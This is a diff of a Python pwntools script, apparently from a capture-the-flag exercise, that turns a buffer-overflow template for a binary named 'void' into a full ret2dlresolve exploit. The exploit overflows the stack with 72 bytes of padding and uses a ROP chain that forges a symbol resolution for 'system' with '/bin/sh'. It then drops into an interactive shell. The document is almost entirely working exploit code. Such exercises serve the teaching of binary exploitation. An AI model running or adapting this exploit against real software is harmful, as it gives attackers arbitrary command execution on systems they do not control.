@@ -1,21 +1,33 @@
-#!/usr/bin/python
-import sys
-import struct
 from pwn import *
 
-context.log_level = 'error'
+# For when you don't have a way to leak a libc address,
+# ret2dlresolve works
 
-e = ELF("./void")
-libc = ELF("./glibc/libc.so.6")
-# p = process(e.path)
-p = gdb.debug(e.path, gdbscript=open('script.gdb', 'r').read())
+context.binary = './void'
+rop = ROP(context.binary)
 
-deadcode = p64(0xdeadc0dedeadc0de)
+dlresolve = Ret2dlresolvePayload(context.binary, symbol='system', args=['/bin/sh\0'])
 
-payload = b'A'*72
-payload += b'B'*8                # rbp
+print("Data address:")
+print(hexdump(dlresolve.data_addr))
+print()
 
-# payload += TARGET_FUNCTION       # function to exec
-# payload += deadcode              # return for TARGET_FUNCTION
+print("ret:")
+print(hexdump(rop.ret[0]))
+print()
 
-p.sendline(payload)
+rop.read(0, dlresolve.data_addr)
+rop.raw(rop.ret[0])
+rop.ret2dlresolve(dlresolve)
+raw_rop = rop.chain()
+
+p = context.binary.process()
+
+print(hexdump(raw_rop))
+
+print()
+print(hexdump(dlresolve.payload))
+
+p.sendline(b'A'*72+raw_rop)
+p.sendline(dlresolve.payload)
+p.interactive()
